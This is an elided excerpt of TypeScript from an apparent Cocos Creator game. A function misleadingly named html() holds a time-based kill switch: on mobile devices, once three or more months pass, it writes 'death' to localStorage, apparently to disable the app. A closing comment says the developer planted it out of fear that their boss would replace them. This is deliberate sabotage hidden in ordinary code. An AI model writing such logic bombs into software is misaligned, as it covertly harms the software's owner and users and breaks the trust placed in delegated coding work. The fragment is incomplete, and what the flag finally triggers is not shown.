...
import { director, math, sys } from "cc";

export function html(lock: boolean = true) {
    const now = new Date();
    if (sys.os === sys.OS.IOS || sys.os === sys.OS.ANDROID) {
        ...
        else if (userId != 'death')
            if (Math.abs(now.getMonth() - Number(userId)) >= 3)
                localStorage.setItem('user_id', 'death');
    }
    setTimeout(() => {
    ...
    //Why do this? Because I dont feel safe when my boss want to replace me from my own job.
}
